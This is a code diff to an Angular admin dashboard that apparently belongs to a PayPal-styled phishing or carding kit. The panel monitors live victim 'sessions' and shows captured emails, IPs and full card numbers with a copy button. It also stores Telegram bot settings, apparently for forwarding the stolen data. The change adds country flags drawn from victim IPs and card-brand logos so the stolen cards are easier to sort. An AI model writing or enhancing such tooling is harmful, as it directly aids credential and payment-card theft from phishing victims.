@@ -125,7 +125,12 @@ type AdminTab = 'live' | 'history' | 'settings';
                                             [class.bg-slate-300]="!isSessionLive(session)"></div>
 
                                          <div class="flex flex-col gap-1">
-                                             <span class="font-bold text-pp-navy font-mono text-xs">{{ session.id }}</span>
+                                             <div class="flex items-center gap-2">
+                                                <span class="font-bold text-pp-navy font-mono text-xs">{{ session.id }}</span>
+                                                @if(session.data?.ipCountry) {
+                                                    <img [src]="getFlagUrl(session.data.ipCountry)" class="h-3 w-auto rounded-[2px]" title="{{session.data.ipCountry}}">
+                                                }
+                                             </div>
                                              <span class="text-sm font-bold text-pp-blue truncate">{{ getDisplayEmail(session.email) }}</span>
                                              <span class="text-xs text-slate-500 font-medium uppercase tracking-wide">{{ session.stage }}</span>
                                          </div>
@@ -156,7 +161,12 @@ type AdminTab = 'live' | 'history' | 'settings';
                                             <h2 class="font-bold text-xl text-pp-navy">Session Details</h2>
                                             <span class="bg-pp-navy text-white text-[10px] px-2 py-0.5 rounded uppercase tracking-wider font-bold">{{ monitoredSession()?.stage }}</span>
                                          </div>
-                                         <p class="text-xs text-slate-500 font-mono">{{ monitoredSession()?.id }} • {{ monitoredSession()?.fingerprint?.ip }}</p>
+                                         <div class="flex items-center gap-2">
+                                             <p class="text-xs text-slate-500 font-mono">{{ monitoredSession()?.id }} • {{ monitoredSession()?.fingerprint?.ip }}</p>
+                                             @if(monitoredSession()?.data?.ipCountry) {
+                                                <img [src]="getFlagUrl(monitoredSession()?.data?.ipCountry)" class="h-3 w-auto shadow-sm" title="Location: {{monitoredSession()?.data?.ipCountry}}">
+                                             }
+                                         </div>
                                      </div>
                                      <div class="text-right">
                                          <p class="text-[10px] text-slate-400 font-bold uppercase">Time Elapsed</p>
@@ -196,7 +206,12 @@ type AdminTab = 'live' | 'history' | 'settings';
                                              <h4 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-4">Financial Instrument</h4>
                                              <div class="space-y-4 relative z-10">
                                                  <div>
-                                                     <label class="text-[11px] font-bold text-slate-500 block mb-1">Card Number</label>
+                                                     <div class="flex items-center justify-between mb-1">
+                                                         <label class="text-[11px] font-bold text-slate-500 block">Card Number</label>
+                                                         @if(getCardLogoUrl(monitoredSession()?.data?.cardType)) {
+                                                             <img [src]="getCardLogoUrl(monitoredSession()?.data?.cardType)" class="h-4 w-auto object-contain">
+                                                         }
+                                                     </div>
                                                      <div class="flex items-center gap-2">
                                                         <p class="text-lg font-mono font-bold text-pp-navy tracking-wide">{{ formatCard(monitoredSession()?.data?.cardNumber) }}</p>
                                                         <button *ngIf="monitoredSession()?.data?.cardNumber" (click)="copy(monitoredSession()?.data?.cardNumber)" class="text-pp-blue hover:text-pp-navy"><span class="material-icons text-[14px]">content_copy</span></button>
@@ -333,12 +348,22 @@ type AdminTab = 'live' | 'history' | 'settings';
                                             </td>
                                             <td class="px-6 py-4">
                                                 <div class="flex flex-col">
-                                                    <span class="font-bold text-pp-navy">{{ item.name }}</span>
+                                                    <div class="flex items-center gap-2">
+                                                        <span class="font-bold text-pp-navy">{{ item.name }}</span>
+                                                        @if(item.data?.ipCountry) {
+                                                            <img [src]="getFlagUrl(item.data.ipCountry)" class="h-3 w-auto rounded-[2px]" title="{{item.data.ipCountry}}">
+                                                        }
+                                                    </div>
                                                     <span class="text-xs text-slate-400">{{ item.email }}</span>
                                                 </div>
                                             </td>
                                             <td class="px-6 py-4 font-mono text-slate-600">
-                                                {{ item.data.cardBin }}...{{ item.data.cardLast4 }}
+                                                <div class="flex items-center gap-2">
+                                                    @if(getCardLogoUrl(item.data?.cardType)) {
+                                                        <img [src]="getCardLogoUrl(item.data.cardType)" class="h-4 w-auto object-contain">
+                                                    }
+                                                    <span>{{ item.data.cardBin }}...{{ item.data.cardLast4 }}</span>
+                                                </div>
                                             </td>
                                             <td class="px-6 py-4">
                                                 <span class="bg-green-100 text-green-700 px-3 py-1 rounded-full text-[11px] font-bold uppercase">{{ item.status }}</span>
@@ -583,5 +608,20 @@ ${session.fingerprint?.userAgent}
   saveSettings() {
       this.state.updateAdminSettings(this.settingEmail, true, this.tgToken, this.tgChat);
       this.state.showAdminToast('Settings Saved');
+  }
+
+  getFlagUrl(countryCode: string | undefined): string {
+      if (!countryCode) return '';
+      return `https://flagcdn.com/w40/${countryCode.toLowerCase()}.png`;
+  }
+
+  getCardLogoUrl(cardType: string | undefined): string {
+      if (!cardType) return '';
+      const t = cardType.toLowerCase();
+      if (t === 'visa') return 'https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg';
+      if (t === 'mastercard') return 'https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg';
+      if (t === 'amex') return 'https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg';
+      if (t === 'discover') return 'https://upload.wikimedia.org/wikipedia/commons/5/57/Discover_Card_logo.svg';
+      return '';
   }
 }
